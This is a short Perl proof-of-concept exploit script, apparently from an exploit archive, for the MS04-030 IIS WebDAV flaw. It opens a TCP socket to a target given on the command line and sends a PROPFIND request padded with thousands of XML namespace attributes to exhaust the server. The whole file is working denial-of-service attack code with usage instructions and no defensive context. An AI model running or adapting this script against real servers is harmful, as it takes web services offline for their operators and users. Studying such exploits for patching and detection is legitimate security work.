#!/usr/bin/perl
# IIS BlowOut 
# POC exploit for MS04-030. Found by Amit Klein. 
# incognito_ergo yahoo com
# usage: perl ms04-030_spl.pl host port

use IO::Socket;

$port = @ARGV[1];
$host = @ARGV[0];


$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 
$port,Proto => "TCP");


for ($count=1; $count<9999; $count++) #more than nuff
{

$xmlatt = $xmlatt. "xmlns:z" . $count . "=\"xml:\" "; 

}



$xmldata = "<?xml version=\"1.0\"?>\r\n<a:propfind xmlns:a=\"DAV:\" " . 
$xmlatt . 
">\r\n<a:prop><a:getcontenttype/></a:prop>\r\n</a:propfind>\r\n\r\n";

$l=length($xmldata);

$req="PROPFIND / HTTP/1.1\nContent-type: text/xml\nHost: 
$host\nContent-length: $l\n\n$xmldata\n\n"; 

syswrite($socket,$req,length($req));

close $socket;

# milw0rm.com [2004-10-20]